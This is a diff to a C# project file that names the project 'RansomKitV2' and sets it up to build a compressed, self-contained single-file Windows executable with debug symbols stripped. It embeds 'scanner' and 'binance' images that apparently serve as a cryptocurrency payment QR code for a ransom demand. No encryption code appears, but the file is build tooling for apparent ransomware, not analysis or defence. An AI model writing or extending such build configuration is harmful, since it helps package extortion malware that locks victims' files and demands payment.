@@ -7,15 +7,34 @@
 		<ImplicitUsings>enable</ImplicitUsings>
 		<Nullable>enable</Nullable>
 
+		<AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+
+		<RootNamespace>RansomKitV2</RootNamespace>
+		<AssemblyName>RansomKitV2</AssemblyName>
+
 		<PublishSingleFile>true</PublishSingleFile>
 		<SelfContained>true</SelfContained>
 		<RuntimeIdentifier>win-x64</RuntimeIdentifier>
 		<IncludeNativeLibrariesForSelfExtract>true</IncludeNativeLibrariesForSelfExtract>
+		<EnableCompressionInSingleFile>true</EnableCompressionInSingleFile>
+		<DebugType>none</DebugType>
+		<Optimize>true</Optimize>
 	</PropertyGroup>
 
 	<ItemGroup>
 		<PackageReference Include="QRCoder" Version="1.4.3" />
 		<PackageReference Include="System.Management" Version="8.0.0" />
+	</ItemGroup>
+
+	<!-- Bundle scanner + binance images inside the exe.
+	     Exists() condition means build won't fail if a file is missing. -->
+	<ItemGroup>
+		<EmbeddedResource Include="scanner.png"  Condition="Exists('scanner.png')" />
+		<EmbeddedResource Include="scanner.jpg"  Condition="Exists('scanner.jpg')" />
+		<EmbeddedResource Include="scanner.jpeg" Condition="Exists('scanner.jpeg')" />
+		<EmbeddedResource Include="binance.png"  Condition="Exists('binance.png')" />
+		<EmbeddedResource Include="binance.jpg"  Condition="Exists('binance.jpg')" />
+		<EmbeddedResource Include="binance.jpeg" Condition="Exists('binance.jpeg')" />
 	</ItemGroup>
 
 	<!-- THIS RUNS COMPILE.BAT AFTER VS BUILDS (BUT AVOIDS THE LOOP) -->
